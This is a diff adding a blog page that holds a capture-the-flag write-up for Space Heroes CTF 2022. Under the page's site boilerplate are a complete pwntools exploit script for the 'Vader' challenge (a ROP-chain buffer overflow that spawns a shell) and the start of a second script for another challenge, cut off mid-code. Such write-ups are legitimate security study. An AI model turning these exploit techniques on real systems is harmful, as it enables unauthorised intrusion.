@@ -1,0 +1,1683 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="google-translate-customization" content="108d9124921d80c3-80e20d618ff053c8-g4f02ec6f3dba68b7-c">
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Space Heroes CTF 2022 WP | dayfly の note</title>
+<meta name="generator" content="Jekyll v4.2.2">
+<meta property="og:title" content="Space Heroes CTF 2022 WP">
+<meta name="author" content="dayfly">
+<meta property="og:locale" content="zh_CN">
+<meta name="description" content="Vader">
+<meta property="og:description" content="Vader">
+<link rel="canonical" href="http://localhost:4000/pwn/2022/04/05/Space_Heroes_CTF_WP.html">
+<meta property="og:url" content="http://localhost:4000/pwn/2022/04/05/Space_Heroes_CTF_WP.html">
+<meta property="og:site_name" content="dayfly の note">
+<meta property="og:type" content="article">
+<meta property="article:published_time" content="2022-04-05T00:00:00+08:00">
+<meta name="twitter:card" content="summary">
+<meta property="twitter:title" content="Space Heroes CTF 2022 WP">
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"dayfly"},"dateModified":"2022-04-05T00:00:00+08:00","datePublished":"2022-04-05T00:00:00+08:00","description":"Vader","headline":"Space Heroes CTF 2022 WP","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/pwn/2022/04/05/Space_Heroes_CTF_WP.html"},"url":"http://localhost:4000/pwn/2022/04/05/Space_Heroes_CTF_WP.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="shortcut icon" href="/fish.ico">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-noto-sans@0.0.72/index.min.css">
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <script src="/assets/js/main.js"></script><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="dayfly の note">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/styles/default.min.css">
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/highlight.min.js"></script>
+<!-- and it's easy to individually load additional languages -->
+<script charset="UTF-8" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/languages/go.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+// Init highlight js
+document.addEventListener('DOMContentLoaded', function(event) {
+  var els = document.querySelectorAll('pre code')
+
+  function addLangData(block) {
+    var outer = block.parentElement.parentElement.parentElement;
+    var lang = block.getAttribute('data-lang');
+    for (var i = 0; i < outer.classList.length; i++) {
+      var cls = outer.classList[i];
+      if (cls.startsWith('language-')) {
+        lang = cls;
+        break;
+      }
+    }
+    if (!lang) {
+      cls = block.getAttribute('class');
+      lang = cls ? cls.replace('hljs ', '') : '';
+    }
+    if (lang.startsWith('language-')) {
+      lang = lang.substr(9);
+    }
+    block.setAttribute('class', 'hljs ' + lang);
+    block.parentNode.setAttribute('data-lang', lang);
+  }
+
+  function addBadge(block) {
+    var enabled = ('false' || 'true').toLowerCase();
+    if (enabled == 'true') {
+      var pre = block.parentElement;
+      pre.classList.add('badge');
+    }
+  }
+
+  function handle(block) {
+    addLangData(block);
+    addBadge(block)
+    hljs.highlightBlock(block);
+  }
+
+  for (var i = 0; i < els.length; i++) {
+    var el = els[i];
+    handle(el);
+  }
+});
+</script>
+
+<style>
+  /* code language badge */
+  pre.badge::before {
+    content: attr(data-lang);
+    color: #fff;
+    background-color: #ff4e00;
+    padding: 0 .5em;
+    border-radius: 0 2px;
+    text-transform: uppercase;
+    text-align: center;
+    min-width: 32px;
+    display: inline-block;
+    position: absolute;
+    right: 0;
+  }
+
+  /* fix wrong badge display for firefox browser */
+  code > table pre::before {
+    display: none;
+  }
+</style>
+</head>
+<body>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<header class="site-header site-header-transparent" role="banner">
+
+  <div class="wrapper">
+    <div class="site-header-inner">
+<span class="site-brand"><a class="site-brand-inner" rel="author" href="/">
+  <img class="site-favicon" title="dayfly の note" src="/fish.ico" onerror="this.style.display='none'">
+  dayfly の note
+</a>
+</span><nav class="site-nav">
+          <input type="checkbox" id="nav-trigger" class="nav-trigger">
+          <label for="nav-trigger">
+            <span class="menu-icon">
+              <svg viewbox="0 0 18 15" width="18px" height="15px">
+                <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"></path>
+              </svg>
+            </span>
+          </label>
+
+          <div class="trigger">
+<a class="page-link" href="/">HOME</a><a class="page-link" href="/archives.html">ARCHIVES</a><a class="page-link" href="/categories.html">CATEGORIES</a><a class="page-link" href="/tags.html">TAGS</a>
+
+
+
+
+</div>
+        </nav>
+</div>
+  </div>
+</header>
+
+<script>
+  (function() {
+    var lastScrollY = getScrollPos().y;
+    var documentElement = document.documentElement;
+
+    function storeScrollData() {
+      var y = getScrollPos().y;documentElement.setAttribute("data-header-transparent", "");var scrollStatus = "";
+
+      if (y <= 0) {
+        scrollStatus = "top";
+      } else if ((window.innerHeight + y) >= document.body.offsetHeight) {
+        scrollStatus = "bottom";
+      } else {
+        var isScrollDown = (y - lastScrollY > 0) ? true : false;
+        scrollStatus = isScrollDown ? "down" : "up";
+      }
+
+      lastScrollY = y;
+      documentElement.setAttribute("data-scroll-status", scrollStatus);
+    }
+
+    window.addEventListener('scroll', function(e) {
+      storeScrollData();
+    });
+
+    storeScrollData();
+  })();
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<style>
+    html .page-banner {
+      background: #000;
+    }
+  </style>
+<style>html .page-banner {
+      height:  36.8vh;
+      min-height: 38vh;
+    }
+    html[data-scroll-status="top"] .page-banner {
+      height: 100vh;
+    }
+  </style>
+<style>
+    html .page-banner .page-banner-img > *:first-child {
+      opacity: 0.618;
+    }
+
+    html[data-theme="dark"] .page-banner .page-banner-img > *:first-child {
+      opacity: 0.443724;
+    }
+  </style>
+<style>
+    html .page-banner .page-banner-inner > *:first-child > *:nth-child(1) {
+      font-size: 5em; font-weight: bold; text-decoration: none; min-width: 1400px
+    }
+  </style>
+<style>
+    html .page-banner .page-banner-inner > *:first-child > *:nth-child(2) {
+      color: gold
+    }
+  </style>
+<section class="page-banner">
+    <div class="page-banner-img">
+<div style="background-image: url(https://wallpaperaccess.com/full/3532041.jpg)"></div>
+        <img class="img-placeholder" src="https://wallpaperaccess.com/full/3532041.jpg">
+</div>
+    <div class="wrapper">
+      <div class="page-banner-inner">
+<header class="post-header">
+  <h1 class="post-title p-name" itemprop="name headline">Space Heroes CTF 2022 WP</h1>
+  <h2 class="post-subtitle">Just Pwn</h2>
+
+  <p class="post-meta">
+    <time class="dt-published" datetime="2022-04-05T00:00:00+08:00" itemprop="datePublished"><i class="fa fa-calendar"></i> Apr 05, 2022
+    </time>
+
+    
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <span class="post-reading-time left-vsplit"><i class="fa fa-clock-o"></i> About 1 hour 29 mins</span>
+  </p>
+<div class="post-tags">
+<a class="post-tag" href="/tags.html#fmt">#fmt</a><a class="post-tag" href="/tags.html#orw">#orw</a><a class="post-tag" href="/tags.html#brop">#brop</a><a class="post-tag" href="/tags.html#srop">#srop</a><a class="post-tag" href="/tags.html#house%20of%20force">#house of force</a><a class="post-tag" href="/tags.html#set">#set</a>
+</div></header>
+</div>
+    </div>
+  </section><script>
+  function hashLocate(hashValue) {
+    hashValue = hashValue.replace(/^.*#h-/, '');
+    hashValue = decodeURIComponent(hashValue);
+    var element = document.getElementById(hashValue);
+
+    if (!element) {
+      return;
+    }
+
+    var header = document.querySelector('header.site-header');
+    var headerRect = header.getBoundingClientRect();
+    var headerTop = Math.floor(headerRect.top);
+    var headerHeight = Math.floor(headerRect.height);
+    var scrollPos = getScrollPos();
+    var offsetY = element.offsetTop - (headerTop + headerHeight + 20);
+
+    if (offsetY == scrollPos.y) {
+      return;
+    }
+
+    if (headerTop == 0  && offsetY > scrollPos.y) {
+      offsetY += headerHeight + 2;
+    } else if (headerTop < 0  && offsetY < scrollPos.y) {
+      offsetY -= headerHeight - 2;
+    }
+
+    smoothScrollTo(offsetY);
+  }
+
+  // The first event occurred
+  window.addEventListener('load', function(event) {
+    if (window.location.hash) {
+      hashLocate(window.location.hash);
+    }
+  });
+
+  // The first event occurred
+  window.addEventListener('click', function(event) {
+    if (event.target.tagName.toLowerCase() == 'a') {
+      hashLocate(event.target.getAttribute('href'));
+    }
+  });
+</script>
+<div class="theme-toggle">
+  <input type="checkbox" id="theme-switch">
+  <label for="theme-switch">
+    <div class="toggle"></div>
+    <div class="names">
+      <p class="light">Light</p>
+      <p class="dark">Dark</p>
+    </div>
+  </label>
+</div>
+
+
+
+
+<script>
+  (function() {
+    var sw = document.getElementById('theme-switch');
+    var html = document.getElementsByTagName('html')[0];
+    var nightModeOption = ('auto' || 'auto').toLowerCase();
+    var storage = nightModeOption === 'manual'
+        ? localStorage
+        : sessionStorage;
+    var themeData = loadThemeData();
+
+    function saveThemeData(data) {
+      storage.setItem('theme', JSON.stringify(data));
+    }
+
+    function loadThemeData() {
+      var data = storage.getItem('theme');
+      try {
+        data = JSON.parse(data ? data : '');
+      } catch(e) {
+        data = { nightShift: undefined, autoToggleAt: 0 };
+        saveThemeData(data);
+      }
+      return data;
+    }
+
+    function handleThemeToggle(nightShift) {
+      themeData.nightShift = nightShift;
+      saveThemeData(themeData);
+      html.dataset.theme = nightShift ? 'dark' : 'light';
+      setTimeout(function() {
+        sw.checked = nightShift ? true : false;
+      }, 50);
+    }
+
+    function autoThemeToggle() {
+      // Next time point of theme toggle
+      var now = new Date();
+      var toggleAt = new Date();
+      var hours = now.getHours();
+      var nightShift = hours >= 19 || hours <=7;
+
+      if (nightShift) {
+        if (hours > 7) {
+          toggleAt.setDate(toggleAt.getDate() + 1);
+        }
+        toggleAt.setHours(7);
+      } else {
+        toggleAt.setHours(19);
+      }
+
+      toggleAt.setMinutes(0);
+      toggleAt.setSeconds(0);
+      toggleAt.setMilliseconds(0)
+
+      var delay = toggleAt.getTime() - now.getTime();
+
+      // auto toggle theme mode
+      setTimeout(function() {
+        handleThemeToggle(!nightShift);
+      }, delay);
+
+      return {
+        nightShift: nightShift,
+        toggleAt: toggleAt.getTime()
+      };
+    }
+
+    // Listen the theme toggle event
+    sw.addEventListener('change', function(event) {
+      handleThemeToggle(event.target.checked);
+    });
+
+    if (nightModeOption == 'auto') {
+      var data = autoThemeToggle();
+
+      // Toggle theme by local setting
+      if (data.toggleAt > themeData.autoToggleAt) {
+        themeData.autoToggleAt = data.toggleAt;
+        handleThemeToggle(data.nightShift);
+      } else {
+        handleThemeToggle(themeData.nightShift);
+      }
+    } else if (nightModeOption == 'manual') {
+      handleThemeToggle(themeData.nightShift);
+    } else {
+      var nightShift = themeData.nightShift;
+      if (nightShift === undefined) {
+        nightShift = nightModeOption === 'on';
+      }
+      handleThemeToggle(nightShift);
+    }
+  })();
+</script>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <div class="framework">
+  <section class="main">
+
+     <div class="post">
+  <section>
+
+
+
+
+
+
+
+
+
+<article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+    <div class="post-content e-content" itemprop="articleBody">
+
+      <h2 id="vader">Vader</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
+<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>
+
+<span class="n">binary</span> <span class="o">=</span> <span class="s">'./vader'</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
+<span class="n">libc_path</span> <span class="o">=</span> <span class="s">'/glibc/buuoj-libc/2.23-amd64/libc-2.23.so'</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc_path</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'r'</span><span class="p">:</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'0.cloud.chals.io'</span><span class="p">,</span> <span class="mi">20712</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">ret2libc</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">,</span> <span class="n">pattern</span><span class="p">,</span> <span class="n">path</span><span class="o">=</span><span class="s">''</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">path</span> <span class="o">==</span> <span class="s">''</span><span class="p">:</span>
+                <span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">leak_addr</span><span class="p">)</span>
+                <span class="n">base</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="n">pattern</span><span class="p">)</span>
+                <span class="n">system</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="s">'system'</span><span class="p">)</span>
+                <span class="n">binsh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="s">'str_bin_sh'</span><span class="p">)</span>
+                <span class="n">execve</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="s">'execve'</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+                <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+                <span class="n">base</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="n">pattern</span><span class="p">]</span>
+                <span class="n">system</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+                <span class="n">binsh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh'</span><span class="p">))</span>
+
+        <span class="k">return</span> <span class="n">system</span><span class="p">,</span> <span class="n">binsh</span><span class="p">,</span> <span class="n">execve</span>
+
+<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
+<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
+<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
+<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
+<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">rls</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">1</span>              <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvlines</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
+<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
+        <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+        <span class="n">pause</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'2'</span><span class="p">)</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)))</span>
+        <span class="n">sa</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'3'</span><span class="p">)</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'4'</span><span class="p">)</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+<span class="c1"># rdi   rsi   rdx   rcx   r8    r9
+</span>
+<span class="n">rdi</span> <span class="o">=</span> <span class="mh">0x000000000040165b</span>
+<span class="n">rsi_r15</span> <span class="o">=</span> <span class="mh">0x0000000000401659</span>
+<span class="n">rdx</span> <span class="o">=</span> <span class="mh">0x00000000004011ce</span>
+<span class="n">rcx_r8</span> <span class="o">=</span> <span class="mh">0x00000000004011d8</span>
+
+<span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'b'</span><span class="o">*</span><span class="p">(</span><span class="mh">0x20</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> 
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x402EC9</span><span class="p">)</span> 
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rsi_r15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x402ECE</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdx</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x402ED3</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rcx_r8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x402ED6</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x402EDA</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40146B</span><span class="p">)</span> 
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4015B5</span><span class="p">)</span>
+
+<span class="n">sla</span><span class="p">(</span><span class="s">'Now I am the master &gt;&gt;&gt; '</span><span class="p">,</span> <span class="n">pay</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">rl</span><span class="p">())</span>
+<span class="n">itr</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h2 id="guardians-of-the-galaxy">Guardians of the Galaxy</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
+<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>
+
+<span class="n">binary</span> <span class="o">=</span> <span class="s">'./guardians'</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
+<span class="n">libc_path</span> <span class="o">=</span> <span class="s">'/glibc/buuoj-libc/2.23-amd64/libc-2.23.so'</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc_path</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'r'</span><span class="p">:</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'0.cloud.chals.io'</span><span class="p">,</span> <span class="mi">12690</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">ret2libc</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">,</span> <span class="n">pattern</span><span class="p">,</span> <span class="n">path</span><span class="o">=</span><span class="s">''</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">path</span> <span class="o">==</span> <span class="s">''</span><span class="p">:</span>
+                <span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">leak_addr</span><span class="p">)</span>
+                <span class="n">base</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="n">pattern</span><span class="p">)</span>
+                <span class="n">system</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="s">'system'</span><span class="p">)</span>
+                <span class="n">binsh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="s">'str_bin_sh'</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+                <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+                <span class="n">base</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="n">pattern</span><span class="p">]</span>
+                <span class="n">system</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+                <span class="n">binsh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh'</span><span class="p">))</span>
+
+        <span class="k">return</span> <span class="n">system</span><span class="p">,</span> <span class="n">binsh</span>
+
+<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
